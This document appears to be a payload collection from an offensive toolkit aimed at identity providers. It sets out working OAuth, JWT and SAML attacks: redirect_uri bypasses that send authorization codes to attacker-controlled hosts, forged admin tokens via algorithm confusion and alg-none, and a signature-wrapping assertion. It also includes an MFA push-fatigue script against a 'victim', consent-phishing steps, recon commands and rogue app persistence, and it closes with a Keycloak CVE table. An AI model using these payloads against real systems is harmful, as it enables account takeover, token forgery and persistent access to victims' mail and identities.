# Payloads — identity-provider-attack

> Attack payloads for identity-provider-attack.

## OAuth Flow Attacks

### State Parameter Reuse

```
GET /authorize?response_type=code&client_id=APP_ID&redirect_uri=https://attacker.com/callback&state=REUSED_STATE
```

### PKCE Downgrade

```python
# If PKCE is optional, omit code_challenge
auth_url = f"/authorize?response_type=code&client_id={APP_ID}&redirect_uri={CALLBACK}"
# No code_challenge parameter
```

### redirect_uri Bypass

```
Legitimate: https://app.contoso.com/callback
Bypass: https://app.contoso.com/callback/../../attacker.com
        https://app.contoso.com/callback?redirect=https://attacker.com
        https://app.contoso.com.evil.com
```

## JWT Attacks

### Algorithm Confusion (RS256 → HS256)

```python
# Step 1: Get public key from JWKS
public_key = get_jwks(kid)

# Step 2: Forge HS256-signed JWT using public key as HMAC secret
import jwt
forged = jwt.encode({"sub":"admin","role":"admin"}, public_key, algorithm="HS256", headers={"kid":kid})
```

### kid Header Injection

```
Header: {"alg":"HS256","kid":"../../dev/null"}
# Some implementations read key from file path; /dev/null is empty string
```

### null signature

```
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
# Some libraries accept "alg: none" and skip signature verification
```

## SAML Attacks

### XML Signature Wrapping

```xml
<Response>
  <Assertion ID="legitimate">...</Assertion>  <!-- Signed -->
  <Assertion ID="attacker">  <!-- Unsigned but processed -->
    <Subject>attacker@evil.com</Subject>
  </Assertion>
</Response>
```

## MFA Fatigue Script

```python
import requests
for _ in range(50):
    requests.post("https://login.contoso.com/mfa/challenge", json={"user":"victim"})
    # User gets 50 push notifications; may approve to silence
```

## OAuth Consent Phishing

```
Register OAuth app "Contoso Security Scanner" with mail.read scope.
Send phishing: "Click here to run security scan" → consent flow.
Attacker now has persistent mail.read access.
```


---

## Additional Payloads

### Reconnaissance

```bash
# Fingerprint target
nmap -sV target.com
whatweb target.com
```

### Exploitation

```bash
# OAuth authorization-code interception via redirect_uri weakness
curl -s "https://idp.target.example/authorize?response_type=code&client_id=APP&redirect_uri=https://attacker.example/cb&state=x"

# JWT alg confusion probe (RS256 token replayed as HS256 with public key as secret)
python3 jwt_tool.py tokens.jwt -X k -pk public.pem
```

### Persistence

```bash
# Rogue OAuth app registration persistence (requires admin consent in lab)
curl -s -X POST "https://graph.target.example/v1.0/applications" \
  -H "Authorization: Bearer $ADMIN_TOKEN" -d @rogue-app-manifest.json
```

---

### Known Identity Provider CVEs (NVD-verified, v0.3.2)

All IDs verified against the NVD API on 2026-09-07 before inclusion.

| CVE | Product | CVSS | Summary (from NVD record) |
|-----|---------|------|----------------------------|
| CVE-2019-14909 | redhat/keycloak | 9.3 | A vulnerability was found in Keycloak 7.x where the user federation LDAP bind type is none (LDAP anonymous bi… |
| CVE-2019-14910 | redhat/keycloak | 9.8 | A vulnerability was found in keycloak 7.x, when keycloak is configured with LDAP user federation and StartTLS… |
| CVE-2017-7474 | keycloak/keycloak-nodejs-auth-utils | 9.8 | It was found that the Keycloak Node.js adapter 2.5 - 3.0 did not handle invalid tokens correctly. An attacker… |
| CVE-2019-10199 | redhat/keycloak | 8.8 | It was found that Keycloak's account console, up to 6.0.1, did not perform adequate header checks in some req… |
| CVE-2019-10201 | redhat/keycloak | 8.1 | It was found that Keycloak's SAML broker, versions up to 6.0.1, did not verify missing message signatures. If… |
| CVE-2019-14832 | redhat/keycloak | 7.5 | A flaw was found in the Keycloak REST API before version 8.0.0 where it would permit user access from a realm… |
